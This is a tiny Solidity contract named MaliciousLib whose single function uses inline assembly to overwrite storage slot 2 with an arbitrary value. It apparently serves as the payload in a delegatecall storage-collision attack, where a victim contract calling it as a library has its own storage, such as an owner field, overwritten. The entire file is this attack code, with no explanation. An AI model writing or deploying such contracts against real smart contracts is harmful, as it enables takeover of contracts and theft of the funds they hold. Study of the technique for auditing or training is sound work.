pragma solidity ^0.8.0;

contract MaliciousLib {

    function setTime(uint256 _time) public {
        assembly {
            sstore(2, _time)
        }
    }

}